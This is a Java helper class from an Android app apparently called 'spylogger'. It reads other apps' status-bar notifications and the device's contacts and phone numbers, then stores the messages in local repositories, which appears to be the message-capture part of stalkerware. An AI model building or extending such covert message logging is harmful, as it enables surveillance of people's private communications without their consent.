package com.gravatasufoca.spylogger.helpers;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.service.notification.StatusBarNotification;

import com.gravatasufoca.spylogger.model.Mensagem;
import com.gravatasufoca.spylogger.model.Topico;
import com.gravatasufoca.spylogger.repositorio.RepositorioMensagem;
import com.gravatasufoca.spylogger.repositorio.RepositorioTopico;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioMensagemImpl;
import com.gravatasufoca.spylogger.repositorio.impl.RepositorioTopicoImpl;
import com.gravatasufoca.spylogger.utils.Utils;
import com.gravatasufoca.spylogger.vos.ContatoVO;

import java.sql.SQLException;
import java.util.List;

/**
 * Created by bruno on 04/06/17.
 */

public abstract class MensagemNotificacao {

    protected Context context;
    private RepositorioTopico repositorioTopico;
    private RepositorioMensagem repositorioMensagem;
    private List<ContatoVO> contatos;
    private StatusBarNotification sbn;

    public MensagemNotificacao(Context context,StatusBarNotification sbn) {
        this.context = context;
        contatos= Utils.getContatos(context.getContentResolver());
        this.sbn = sbn;
        add();
    }

    protected abstract void add();

    protected RepositorioMensagem getRepositorioMensagem() {
        if (repositorioMensagem == null) {
            try {
                repositorioMensagem = new RepositorioMensagemImpl(context);
            } catch (SQLException e) {
            }
        }
        return repositorioMensagem;
    }

    protected RepositorioTopico getRepositorioTopico() {
        if (repositorioTopico == null) {
            try {
                repositorioTopico = new RepositorioTopicoImpl(context);
            } catch (SQLException e) {
            }
        }
        return repositorioTopico;
    }


    protected ContatoVO getContato(String uri) {
        Cursor cursor = Utils.getCursorContato(context, uri);
        if (cursor != null && contatos != null) {
            String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
            for (ContatoVO contato : contatos) {
                if (contato.getSourceId().equals(id)){
                    contato.setNumero(Utils.getPhoneNumber(context.getContentResolver(),id));
                    return contato;
                }
            }
        }
        return null;
    }


    protected StatusBarNotification getSbn() {
        return sbn;
    }

    protected Topico getTopico(){
        return null;
    }

    protected Mensagem getMensagem(){
        return null;
    }
}
